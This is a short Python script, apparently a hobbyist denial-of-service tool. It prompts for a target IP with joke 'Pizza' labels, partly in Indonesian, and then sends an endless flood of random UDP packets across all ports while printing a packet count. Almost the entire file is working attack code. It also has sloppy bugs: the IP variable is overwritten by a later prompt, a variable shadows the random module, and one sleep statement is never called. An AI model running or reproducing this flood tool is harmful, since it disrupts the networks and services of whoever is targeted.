#Author WHITE L'
import socket
import os
import random
import time
import sys

white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(666)
bytes = random._urandom(666)
bytes = random._urandom(666)
bytes = random._urandom(1590)

os.system("clear")

ip = input("[+] Pizza IP : ")
port = input("[+] Pizza Port : ")
sent = ip = input("[+] Masukan Jumlah Pizza Ke Dalam Box : ")
random = input("[+] Random Tools : ")
ping = input("[+] Jumlah Pizza 1-500000 : ")
os.system("clear") 
print("Attack starting...")
time.sleep
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        print("\033[1;91mSend \033[1;32m%s \033[1;91m Packets to \033[1;32m%s \033[1;91mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92mAttack finished\033[0m")
